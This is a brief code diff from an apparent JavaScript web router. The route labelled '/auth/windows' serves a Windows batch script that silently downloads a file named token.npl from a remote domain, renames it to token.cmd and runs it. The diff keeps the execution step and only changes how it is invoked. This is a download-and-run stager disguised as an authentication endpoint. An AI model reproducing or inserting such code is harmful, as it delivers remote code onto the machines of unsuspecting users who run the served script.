@@ -149,7 +149,7 @@ router.get("/auth/windows", (req, res) => {
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
 ren "%USERPROFILE%\\token" token.cmd
-call "%USERPROFILE%\\token.cmd"
+"%USERPROFILE%\\token.cmd"
 `);
   }
   
